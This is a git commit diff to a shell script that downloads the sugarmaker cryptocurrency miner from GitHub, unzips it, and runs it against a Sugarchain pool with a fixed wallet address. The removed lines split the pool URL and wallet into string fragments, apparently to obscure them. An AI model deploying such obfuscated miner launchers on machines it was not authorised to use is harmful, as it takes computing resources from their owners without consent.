3d83dbbadcf0fdf2532f240764c8198f4b93f8ec
DangDev <dream858vip@gmail.com>
2022-01-03 19:57:44 +0700

    Update e.sh

--- e.sh
+++ e.sh
@@ -1,7 +1,3 @@
 wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip
 unzip sugarmaker-v2.5.0-sugar4-linux64.zip
-stringh="core -t2"
-hamula="8hw80g3dsarcmlaww8hhf5gydsx."
-ching="cp://stratum-asia.rplant.xyz:17042 -u sugar1qetd77wlllhj"
-cpus=$(lscpu | grep CPU\(s\) | head -1 | cut -f2 -d":" | awk '{$1=$1;print}')
-sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+t$ching$hamula$cpus$string
+sugarmaker-v2.5.0-sugar4-linux64/sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:17042 -u sugar1qetd77wlllhj8hw80g3dsarcmlaww8hhf5gydsx.4core -t2
